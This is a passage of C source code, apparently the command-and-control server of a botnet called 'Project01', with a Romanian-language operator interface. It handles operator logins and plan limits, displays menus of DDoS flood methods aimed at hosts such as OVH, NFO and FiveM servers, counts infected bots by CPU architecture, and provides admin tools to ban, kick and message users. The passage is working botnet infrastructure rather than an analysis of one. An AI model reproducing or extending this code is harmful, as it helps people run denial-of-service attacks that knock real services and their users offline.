		        char banner0   [2400];
		        char banner13  [2400];

		        char *userlog  [1200];

 				char hostbuffer[256]; 
    			int hostname; 
    			hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
    			checkHostName(hostname); 
 				if(!strcmp(accounts[find_line].admin, "admin")) 
 				{
 					managements[datafd].adminstatus = 1;
 				} else {
 					pthread_create(&timeloggedin, NULL, &timeconnected, sock);
 				}

                char clearscreen1 [2048];
				memset(clearscreen1, 0, 2048);
				sprintf(clearscreen1, "\033[2J\033[1;1H");	
				sprintf(managements[datafd].my_ip, "%s", ipinfo);
				sprintf(managements[datafd].id, "%s", accounts[find_line].username);
				sprintf(managements[datafd].planname, "%s", accounts[find_line].admin);
				managements[datafd].mycooldown = accounts[find_line].cooldown;
				managements[datafd].mymaxtime = accounts[find_line].maxtime;

				int loginshit;
				for(loginshit=0;loginshit<MAXFDS;loginshit++)
				{
					if(gay[datafd].just_logged_in == 0 && managements[loginshit].LoginListen == 1 && managements[loginshit].connected == 1 && loggedin == 0)
					{
						sprintf(usethis, "\r\n%s Plan: [%s] Just Logged In!\r\n", managements[datafd].id, managements[datafd].planname);
						printf(usethis, "[Project01]:%s Plan: [%s] Just Logged In!\r\n", managements[datafd].id, managements[datafd].planname);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\e[38;5;124m%s@\e[38;5;54mProject01~#\e[38;5;124m", managements[loginshit].id);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						gay[datafd].just_logged_in = 3;
					}
				}
				memset(ipinfo, 0, sizeof(ipinfo));	
			
				//banner - loading screen removed

				sprintf(banner0,  "\e[38;5;54mMOTD:\e[38;5;124m %s\r\n", motd); 
				sprintf(banner13, "   \e[38;5;124mSalutare, \e[38;5;54m%s \e[38;5;124mbun venit pe \e[38;5;54m 𝘱𝘳𝘰𝘫𝘦𝘤𝘵 －０１ 影子 𝗻𝗲𝘁𝘄𝗼𝗿𝗸\r\n", accounts[find_line].username);
				if(send(datafd, clearscreen1,  strlen(clearscreen1),	MSG_NOSIGNAL) == -1) goto end;
				if(strlen(motd) > 1){
					if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;
				}

				if(motdaction == 1)
				{
					if(send(datafd, banner0, strlen(banner0), MSG_NOSIGNAL) == -1) goto end;
				}
				if(send(datafd, clearscreen1,  strlen(clearscreen1),	MSG_NOSIGNAL) == -1) goto end;
				


           
		while(1) {
		char input [5000];
        sprintf(input, "\r\n\e[38;5;124m%s@\e[38;5;54mProject01~#\e[38;5;124m", managements[datafd].id);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   

      		if(strcasestr(buf, "help") || strcasestr(buf, "ajutor")) 
      		{
					pthread_create(&title, NULL, &TitleWriter, sock);
	  				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  				if(send(datafd, banner13,  strlen(banner13),	MSG_NOSIGNAL) == -1) goto end;
	
					char help1  [800];
					char help2  [800];
					char help3  [800];
					char help4  [800];
					char help5  [800];
					char help7  [800];
					char help10  [800];
					char help11  [800];
					char help12  [800];
					char help13  [800];
        	        sprintf(help1,   "             \e[38;5;54m ╔═\e[38;5;124m╔══║\e[38;5;54m══════════════════════════════════\e[38;5;124m║══╗\e[38;5;54m═╗\r\n");
					sprintf(help2,   "             \e[38;5;54m ║\e[38;5;124m═╝\e[38;5;54m════════════════════════════════════════\e[38;5;124m╚═\e[38;5;54m║\r\n");
					sprintf(help3,   "             \e[38;5;54m ║     \e[97mMETHODS    \e[38;5;124m---\e[97mArata Metodele Simple    \e[38;5;54m║\r\n");
					sprintf(help4,   "             \e[38;5;54m ║     \e[97mSPECIAL    \e[38;5;124m---\e[97mArata Metodele Speciale  \e[38;5;54m║\r\n");
    			    sprintf(help5,   "             \e[38;5;54m ║     \e[97mBOT        \e[38;5;124m---\e[97mArata Nr de device-uri   \e[38;5;54m║\r\n");
    			    sprintf(help7,   "             \e[38;5;54m ║     \e[97mADMIN      \e[38;5;124m---\e[97mArata Comenzi Admin      \e[38;5;54m║\r\n");
        	        sprintf(help10,  "             \e[38;5;54m ║     \e[97mCLS        \e[38;5;124m---\e[97mCurata Screen-ul         \e[38;5;54m║\r\n");
        	        sprintf(help11,  "             \e[38;5;54m ║\e[38;5;124m═╗\e[38;5;54m════════════════════════════════════════\e[38;5;124m╔═\e[38;5;54m║\r\n");
        	        sprintf(help12,  "             \e[38;5;54m ╚═\e[38;5;124m╚══║\e[38;5;54m══════════════════════════════════\e[38;5;124m║══╝\e[38;5;54m═╝\r\n");
        	        
					if(send(datafd, help1,  strlen(help1),  MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, help2,  strlen(help2),  MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, help3,  strlen(help3),  MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, help4,  strlen(help4),  MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, help5,  strlen(help5),  MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, help7,  strlen(help7),  MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, help10,  strlen(help10),  MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, help11,  strlen(help11),  MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, help12,  strlen(help12),  MSG_NOSIGNAL) == -1) goto end;
					pthread_create(&title, NULL, &TitleWriter, sock);
					char input [5000];
        			sprintf(input, "\r\n\e[38;5;124m%s@\e[38;5;54mProject01~#\e[38;5;124m", accounts[find_line].username);
					if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto Banner;
							continue;
 			}

 			if(strcasestr(buf, "testing"))
 			{
 				int i;
 				for(i=0;i < attacksrunning;i++){
 					sprintf(usethis, "%s: %s IP: %s Port: %s Time: %d Time Left: %s", Sending[i].username, Sending[i].method, Sending[i].ip, Sending[i].attacktime, Sending[i].attacktimeleft);
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 				}
 			}

 			if(strcasestr(buf, "method"))
 			{
				pthread_create(&title, NULL, &TitleWriter, sock);
	    	    send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	    	    if(send(datafd, banner13,  strlen(banner13),	MSG_NOSIGNAL) == -1) goto end;
	  	
	  			char attack0  [800];
				char attack1  [800];
				char attack2  [800];
				char attack3  [800];
				char attack4  [800];
				char attack5  [800];
				char attack6  [800];
				char attack7  [800];
				char attack8  [800];
				char attack9  [800];
				char attack10 [800];
				char attack11 [800];
				char attack12 [800];
				char disabled1[800];
				char disabled2[800];
				char disabled3[800];
				
        	    sprintf(attack0,   "              \e[38;5;54m╔═\e[38;5;54m╔══║\e[38;5;54m══════════════════════════════════════════\e[38;5;124m║══╗\e[38;5;54m═╗\r\n");  
				sprintf(attack1,   "              \e[38;5;54m║\e[38;5;54m═╝\e[38;5;54m════════════════════════════════════════════════\e[38;5;124m╚═\e[38;5;54m║\r\n");
				sprintf(attack2,   "              \e[38;5;54m                   ╚😈𝒮𝐼𝑀𝒫𝐿𝐸\e[38;5;124m 𝑀𝐸𝒯𝐻𝒪𝒟𝒮😈╗                            \r\n");
				sprintf(attack3,   "			  \e[38;5;54m																				   \r\n");
				sprintf(attack4,   "              \e[38;5;54m   \e[97m!* STD IP PORT TIME       \e[38;5;124m---\e[97mSimple STD Flood          \r\n");
				sprintf(attack5,   "              \e[38;5;54m   \e[97m!* RANDHEX IP PORT TIME   \e[38;5;124m---\e[97mRandom HEX String         \r\n");   
				sprintf(attack6,   "              \e[38;5;54m   \e[97m!* L7 IP PORT TIME 1024   \e[38;5;124m---\e[97mL7 HEX Flood              \r\n");   
				sprintf(attack7,   "              \e[38;5;54m   \e[97m!* UDPRAW IP PORT TIME    \e[38;5;124m---\e[97mRAW UDPHEX Flood          \r\n");     
        	    sprintf(attack8,   "              \e[38;5;54m   \e[97m!* GAME IP PORT TIME      \e[38;5;124m---\e[97mVSEHEX Flood              \r\n");
        	    sprintf(attack9,   "              \e[38;5;54m   \e[97m!* STDHEX IP PORT TIME    \e[38;5;124m---\e[97mCustom STDHEX Flood       \r\n");
        	    sprintf(attack10,  "              \e[38;5;54m                                                     							   \r\n");
        	    sprintf(attack11,  "              \e[38;5;54m║\e[38;5;124m═╗\e[38;5;54m════════════════════════════════════════════════╔═\e[38;5;54m║\r\n");
        	    sprintf(attack12,  "              \e[38;5;54m╚═\e[38;5;124m╚══║\e[38;5;54m══════════════════════════════════════════\e[38;5;54m║══╝\e[38;5;54m═╝\r\n");  
        	    sprintf(disabled1, "              \e[38;5;54m╔══════════════════════════════════════════════════╗  \r\n");
        	    sprintf(disabled2, "              \e[38;5;54m║ \e[38;5;124mMENTENANTA, Atacurile sunt momentan dezactivate! \e[38;5;54m║  \r\n");
        	    sprintf(disabled3, "              \e[38;5;54m╚══════════════════════════════════════════════════╝  \r\n");

	  			if(AttackStatus == 0)
	  			{
        	        if(send(datafd, attack0,  strlen(attack0),	MSG_NOSIGNAL) == -1) goto end;               
					if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack2,  strlen(attack2),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack3,  strlen(attack3),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack4,  strlen(attack4),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack5,  strlen(attack5),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack6,  strlen(attack6),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack7,  strlen(attack7),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack8,  strlen(attack8),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack9,  strlen(attack9),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack10,  strlen(attack10),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack11,  strlen(attack11),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack12,  strlen(attack12),	MSG_NOSIGNAL) == -1) goto end;
	  			} else {
	  				if(send(datafd, disabled1, strlen(disabled1), MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, disabled2, strlen(disabled2), MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, disabled3, strlen(disabled3), MSG_NOSIGNAL) == -1) goto end;
	  			}
	
	
					pthread_create(&title, NULL, &TitleWriter, sock);
			}
			if(strcasestr(buf, "special"))
 			{
				pthread_create(&title, NULL, &TitleWriter, sock);
	    	    send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	    	    if(send(datafd, banner13,  strlen(banner13),	MSG_NOSIGNAL) == -1) goto end;
	  	
	  			char sp1 [800];
				char sp2 [800];
				char sp3 [800];
				char sp4 [800];
				char sp5 [800];
				char sp6 [800];
				char sp7 [800];
				char sp8 [800];
				char sp9 [800];
				char sp10 [800];
				char sp11 [800];
				char sp12 [800];
				char sp15 [800];
				char sp16 [800];
				char sp17 [800];

				
        	    sprintf(sp1,   "  \e[38;5;54m╔════════════════════════════════════════════════╗\r\n");  //API METHODS
				sprintf(sp2,   "  \e[38;5;54m║                \e[97m╚😈𝑀𝑒𝓉𝑜𝒹𝑒 𝒮𝓅𝑒𝒸𝒾𝒶𝓁𝑒😈╗           \e[38;5;54m║\r\n");
				sprintf(sp3,   "  \e[38;5;54m╠\e[38;5;124m════════════════════════════════════════════════\e[38;5;54m╣      \r\n");
				sprintf(sp4,   "  \e[38;5;54m║   \e[38;5;14mWRA             \e[38;5;14mOD-DOWN       \e[38;5;14mNFO-MOB        \e[38;5;54m║     \r\n");
				sprintf(sp5,   "  \e[38;5;54m║   \e[38;5;14mDNS             \e[38;5;14mVPN-DOWN      \e[38;5;14mSY-KILLALL     \e[38;5;54m║     \r\n");   
				sprintf(sp6,   "  \e[38;5;54m║   \e[38;5;14mSOS             \e[38;5;14mTCP-DOWN      \e[38;5;14mSY-KILLALLV2   \e[38;5;54m║     \r\n");   
				sprintf(sp7,   "  \e[38;5;54m║   \e[38;5;14mODIN            \e[38;5;14mNFO-DOWN      \e[38;5;14mSY-KILLALLV3   \e[38;5;54m║     \r\n");     
        	    sprintf(sp8,   "  \e[38;5;54m║   \e[38;5;14mREDSYN          \e[38;5;14mOVH-DOWN      \e[38;5;14mSY-KILLALLV4   \e[38;5;54m║     \r\n");
        	    sprintf(sp9,   "  \e[38;5;54m║   \e[38;5;14mDEDIPATH        \e[38;5;14mOVH-CRUSH                    \e[38;5;54m║\r\n");
        	    sprintf(sp10,  "  \e[38;5;54m║   \e[38;5;14mSERVER          \e[38;5;14mOVH-GAME                     \e[38;5;54m║\r\n");
        	    sprintf(sp11,  "  \e[38;5;54m║   \e[38;5;14mSERVERV2        \e[38;5;14mGAME-NFO                     \e[38;5;54m║\r\n");
        	    sprintf(sp12,  "  \e[38;5;54m║   \e[38;5;14mARK-DESTROY     \e[38;5;14mFIVEM-NFO                    \e[38;5;54m║\r\n");  
        	    sprintf(sp15,  "  \e[38;5;54m╠\e[38;5;124m════════════════════════════════════════════════\e[38;5;54m╣\r\n");
        	    sprintf(sp16,  "  \e[38;5;54m║        \e[38;5;14mSEND \e[97m(\e[38;5;14mMETHOD\e[97m) (\e[38;5;14mIP\e[97m) (\e[38;5;14mPORT\e[97m) (\e[38;5;14m60\e[97m)          \e[38;5;54m║\r\n");
        	    sprintf(sp17,  "  \e[38;5;54m╚════════════════════════════════════════════════╝\r\n");


	  			if(send(datafd, sp1,  strlen(sp1),	MSG_NOSIGNAL) == -1) goto end;               
				if(send(datafd, sp2,  strlen(sp2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp3,  strlen(sp3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp4,  strlen(sp4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp5,  strlen(sp5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp6,  strlen(sp6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp7,  strlen(sp7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp8,  strlen(sp8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp9,  strlen(sp9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp10,  strlen(sp10),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp11,  strlen(sp11),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp12,  strlen(sp12),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp15,  strlen(sp15),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp16,  strlen(sp16),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, sp17,  strlen(sp17),	MSG_NOSIGNAL) == -1) goto end;
	  			
	  		
	
	        }
					pthread_create(&title, NULL, &TitleWriter, sock);

			if (strcasestr(buf, "bot") || strcasestr(buf, "bots"))
			{
        	    char synpur1[128];
        	    char synpur2[128];
        	    char synpur3[128];
        	    char synpur4[128];
        	    char synpur5[128];
        	    char synpur6[128];
        	    char synpur7[128];
        	    char synpur8[128];
	
	  			send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  			if(send(datafd, banner13,  strlen(banner13),	MSG_NOSIGNAL) == -1) goto end;
	  			sprintf(synpur8, "\e[38;5;54mNumbers: [\e[92m%d\e[38;5;54m] \r\n",  botsconnect());
      			if(send(datafd, synpur8, strlen(synpur8), MSG_NOSIGNAL) == -1) goto end;
	
        	    if(x86Connected() != 0)
        	    {
        	        sprintf(synpur1,"\e[38;5;54mX86: [\e[92m%d\e[38;5;54m] \r\n",     x86Connected());
        	        if(send(datafd, synpur1, strlen(synpur1), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(mpslConnected() != 0)
        	    {
        	        sprintf(synpur4,"\e[38;5;54mMPSl: [\e[92m%d\e[38;5;54m] \r\n",     mpslConnected());
        	        if(send(datafd, synpur4, strlen(synpur4), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(ppcConnected() != 0)
        	    {
        	        sprintf(synpur5,"\e[38;5;54mPPC: [\e[92m%d\e[38;5;54m] \r\n",     ppcConnected());
        	        if(send(datafd, synpur5, strlen(synpur5), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(spcConnected() != 0)
        	    {
        	        sprintf(synpur6,"\e[38;5;54mSPC: [\e[92m%d\e[38;5;54m] \r\n",     spcConnected());
        	        if(send(datafd, synpur6, strlen(synpur6), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(unknownConnected() != 0)
        	    {
        	        sprintf(synpur7,"\e[38;5;54mUNKNOWN: [\e[92m%d\e[38;5;54m] \r\n",     unknownConnected());
        	        if(send(datafd, synpur7, strlen(synpur7), MSG_NOSIGNAL) == -1) goto end;
        	    }
				pthread_create(&title, NULL, &TitleWriter, sock);
			
			}

 		    if(strcasestr(buf, "admin"))
 		    {
				if(!strcasecmp(accounts[find_line].admin, "admin"))
				{
					pthread_create(&title, NULL, &TitleWriter, sock);
	  				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
	  				if(send(datafd, banner13,  strlen(banner13),	MSG_NOSIGNAL) == -1) goto end;
					char admin1  [800];
					char admin2  [800];
					char admin3  [800];
					char admin4  [800];
					char admin5  [800];
					char admin6  [800];
					char admin7  [800];
					char admin8  [800];
					char admin9  [800];
					char admin10  [800];
					char admin11  [800];
					sprintf(admin1,  "              \e[38;5;54m╔═\e[38;5;124m╔══║\e[38;5;54m══════════════════════════════════════\e[38;5;124m║══╗\e[38;5;54m═╗\r\n");
					sprintf(admin2,  "              \e[38;5;54m║\e[38;5;124m═╝\e[38;5;54m════════════════════════════════════════════\e[38;5;124m╚═\e[38;5;54m║\r\n");
					sprintf(admin3,  "              \e[38;5;54m║                                                \e[38;5;54m║\r\n");
					sprintf(admin4,  "              \e[38;5;54m║   \e[97mUser            \e[38;5;124m---\e[97mArata toate comenzile user\e[38;5;54m║\r\n");
					sprintf(admin5,  "              \e[38;5;54m║   \e[97mBroadcast       \e[38;5;124m---\e[97mSeteaza un anunt text     \e[38;5;54m║\r\n");
					sprintf(admin6,  "              \e[38;5;54m║   \e[97mTogglelisten    \e[38;5;124m---\e[97mArata atacurile trimise   \e[38;5;54m║\r\n");
					sprintf(admin7,  "              \e[38;5;54m║   \e[97mToggleAttacks   \e[38;5;124m---\e[97mDezactiveaza atacurile    \e[38;5;54m║\r\n");
					sprintf(admin8,  "              \e[38;5;54m║   \e[97mTogglelogin     \e[38;5;124m---\e[97mArata loguri conectare    \e[38;5;54m║\r\n");
					sprintf(admin9,  "              \e[38;5;54m║                                                \e[38;5;54m║\r\n");
					sprintf(admin10, "              \e[38;5;54m║\e[38;5;124m═╗\e[38;5;54m════════════════════════════════════════════\e[38;5;124m╔═\e[38;5;54m║\r\n");
					sprintf(admin11, "              \e[38;5;54m╚═\e[38;5;124m╚══║\e[38;5;54m══════════════════════════════════════\e[38;5;124m║══╝\e[38;5;54m═╝\r\n");	
	
					if(send(datafd, admin1, strlen(admin1), MSG_NOSIGNAL) == -1) goto end; 
					if(send(datafd, admin2, strlen(admin2), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin3, strlen(admin3), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin4, strlen(admin4), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin5, strlen(admin5), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin6, strlen(admin6), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin7, strlen(admin7), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin8, strlen(admin8), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin9, strlen(admin9), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin10, strlen(admin10), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, admin11, strlen(admin11), MSG_NOSIGNAL) == -1) goto end;
					pthread_create(&title, NULL, &TitleWriter, sock);
			 	}
 			}


			else if(strcasestr(buf, "msg") || strcasestr(buf, "message"))
			{	
				int tosend;
				char sentmsg[800];
				char msg[800];
				char usertomsg[800];
				sprintf(usethis, "User:");
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				memset(buf, 0, sizeof(buf));
				if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
				trim(buf);
				strcpy(usertomsg, buf);
		
				sprintf(usethis, "MSG:");
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				memset(buf, 0, sizeof(buf));
				if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
				trim(buf);
				strcpy(msg, buf);
				if(strcasestr(msg, "amerika") || strcasestr(msg, "afrik") || strcasestr(msg, "afrikan") || strcasestr(msg, "pentest") || strcasestr(msg, "walak") || strcasestr(msg, "onion") || strcasestr(msg, "keen"))
				{
					sprintf(usethis, "\e[38;5;190mAceste cuvinte nu sunt permise!\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					sleep(2);
				} else {
		
				for(tosend=0;tosend < MAXFDS;tosend++){
					if(strstr(managements[tosend].id, usertomsg))
					{
						if(managements[tosend].msgtoggle == 0)
						{
							char sendmsg[800];
							sprintf(sendmsg, "\r\n\e[38;5;190mMSG From %s: %s\r\n", managements[datafd].id, msg);
							if(send(tosend, sendmsg, strlen(sendmsg), MSG_NOSIGNAL) == -1) goto end;
							sprintf(sendmsg, "\r\n\e[38;5;124m%s@\e[38;5;54mProject01~#\e[38;5;124m", managements[tosend].id);
							if(send(tosend, sendmsg, strlen(sendmsg), MSG_NOSIGNAL) == -1) goto end;
							sent = 1;
						} else {
							sent = 3;
						}
					}
				}		
					if(sent == 1)
					{
						printf("[Project01]:%s Sent A Message To:%s Msg: %s\n", managements[datafd].id, usertomsg, msg);
						sprintf(sentmsg, "\e[38;5;190mMsg Sent to: %s\r\n", usertomsg);
						if(send(datafd, sentmsg, strlen(sentmsg), MSG_NOSIGNAL) == -1) goto end;
						sent = 0;
					}
					else if(sent == 3)
					{
						sprintf(usethis, "\e[38;5;190mUseru %s Are Mesajele OFF\r\n", usertomsg);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					}
		
					else if(!sent)  
					{
						sprintf(usethis, "\e[38;5;190mUseru %s nu e Online\r\n", usertomsg);
						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						memset(msg,0,sizeof(msg));
					} 
				}
				memset(buf,0,sizeof(buf));
			}

			if(strcasestr(buf, "online"))
			{
			      send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
				  if(send(datafd, banner13,  strlen(banner13),	MSG_NOSIGNAL) == -1) goto end;
				if(managements[datafd].adminstatus == 1)
				{
					int online;
					sprintf(usethis, "\e[38;5;54mUseri Online\r\n");
					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					for(online=0;online < MAXFDS; online++)
					{
						if(strlen(managements[online].id) > 1 && managements[online].connected == 1) 
						{
							if(strcmp(managements[online].planname, "admin") == 0)
							{
								sprintf(botnet, "\e[38;5;190m%s | IP: ADMIN PROTECTION\r\n", managements[online].id);
								if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
							} else {
								sprintf(botnet, "\e[38;5;14m%s | IP: %s\r\n", managements[online].id, managements[online].my_ip);
								if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
							}
						}
					}
				} else 
				{
					int online;
					for(online=0;online < MAXFDS; online++)
					{
						if(strlen(managements[online].id) > 1 && managements[online].connected == 1) 
						{
							sprintf(botnet, "\e[38;5;190m%s | IP: ADMIN PROTECTION\r\n", managements[online].id);
							if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
						}
					}
				}
				sprintf(botnet, "\e[38;5;124mTotal Useri Online: %d\r\n", OperatorsConnected);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
			}



			if(strcasestr(buf, "user")) {
				if(managements[datafd].adminstatus == 1)
				{
					char options[80];
					char cmd1[800];
					char send1[800];
					char whatyucanuse1[2048];
					char whatyucanuse2[2048];
					char whatyucanuse3[2048];
					char whatyucanuse4[2048];
					char whatyucanuse5[2048];
					char whatyucanuse6[2048];
					char whatyucanuse7[2048];
					char whatyucanuse8[2048];
					char whatyucanuse9[2048];
					char whatyucanuse10[2048];
					char whatyucanuse11[2048];
					char whatyucanuse12[2048];
					char whatyucanuse13[2048];
					char whatyucanuse14[2048];
					char whatyucanuse15[2048];
					char whatyucanuse16[2048];
					char whatyucanuse17[2048];
					char whatyucanuse18[2048];
			
			
					sprintf(whatyucanuse1,  "    \e[38;5;54m  ╔═════════════\e[38;5;124m╗   \e[38;5;54m╔═════════════\e[38;5;124m╗\r\n");
					sprintf(whatyucanuse2,  "    \e[38;5;54m1 ║  \e[38;5;14mAdd User.  \e[38;5;124m║ \e[38;5;54m7 ║  \e[38;5;14mKick User. \e[38;5;124m║\r\n");
					sprintf(whatyucanuse3,  "    \e[38;5;54m  ╚\e[38;5;124m═════════════╝   \e[38;5;54m╚\e[38;5;124m═════════════╝\r\n");
					sprintf(whatyucanuse4,  "    \e[38;5;54m  ╔═════════════\e[38;5;124m╗   \e[38;5;54m╔═════════════\e[38;5;124m╗\r\n");
					sprintf(whatyucanuse5,  "    \e[38;5;54m2 ║  \e[38;5;14mRem User.  \e[38;5;124m║ \e[38;5;54m8 ║  \e[38;5;14mBlacklist. \e[38;5;124m║\r\n");
					sprintf(whatyucanuse6,  "    \e[38;5;54m  ╚\e[38;5;124m═════════════╝   \e[38;5;54m╚\e[38;5;124m═════════════╝\r\n");
					sprintf(whatyucanuse7,  "    \e[38;5;54m  ╔═════════════\e[38;5;124m╗   \r\n");
					sprintf(whatyucanuse8,  "    \e[38;5;54m3 ║  \e[38;5;14mBan User.  \e[38;5;124m║   \r\n");
					sprintf(whatyucanuse9,  "    \e[38;5;54m  ╚\e[38;5;124m═════════════╝   \r\n");
					sprintf(whatyucanuse10, "    \e[38;5;54m  ╔═════════════\e[38;5;124m╗   \r\n");
					sprintf(whatyucanuse11, "    \e[38;5;54m4 ║ \e[38;5;14mUnBan User. \e[38;5;124m║   \r\n");
					sprintf(whatyucanuse12, "    \e[38;5;54m  ╚\e[38;5;124m═════════════╝   \r\n");
					sprintf(whatyucanuse13, "    \e[38;5;54m  ╔═════════════\e[38;5;124m╗   \r\n");
					sprintf(whatyucanuse14, "    \e[38;5;54m5 ║ \e[38;5;14mIPBan User. \e[38;5;124m║   \r\n");
					sprintf(whatyucanuse15, "    \e[38;5;54m  ╚\e[38;5;124m═════════════╝   \r\n");
					sprintf(whatyucanuse16, "    \e[38;5;54m  ╔═══════════════\e[38;5;124m╗ \r\n");
					sprintf(whatyucanuse17, "    \e[38;5;54m6 ║ \e[38;5;14mUnIPBan User. \e[38;5;124m║ \r\n");
					sprintf(whatyucanuse18, "    \e[38;5;54m  ╚\e[38;5;124m═══════════════╝ \r\n");
			
			
					if(send(datafd, whatyucanuse1, strlen(whatyucanuse1), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse2, strlen(whatyucanuse2), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse3, strlen(whatyucanuse3), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse4, strlen(whatyucanuse4), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse5, strlen(whatyucanuse5), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse6, strlen(whatyucanuse6), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse7, strlen(whatyucanuse7), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse8, strlen(whatyucanuse8), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse9, strlen(whatyucanuse9), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse10, strlen(whatyucanuse10), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse11, strlen(whatyucanuse11), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse12, strlen(whatyucanuse12), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse13, strlen(whatyucanuse13), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse14, strlen(whatyucanuse14), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse15, strlen(whatyucanuse15), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse16, strlen(whatyucanuse16), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse17, strlen(whatyucanuse17), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, whatyucanuse18, strlen(whatyucanuse18), MSG_NOSIGNAL) == -1) goto end;
			
					sprintf(options, "\e[38;5;190mOption:");
